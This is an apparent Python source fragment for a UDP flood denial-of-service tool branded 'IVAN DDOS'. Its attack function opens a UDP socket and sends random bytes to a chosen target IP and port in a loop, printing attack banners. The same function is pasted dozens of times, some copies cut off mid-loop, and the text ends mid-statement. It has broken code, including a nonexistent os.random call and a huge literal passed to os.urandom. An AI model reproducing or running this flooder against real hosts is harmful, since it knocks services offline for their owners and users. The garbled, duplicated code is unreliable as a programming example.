    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
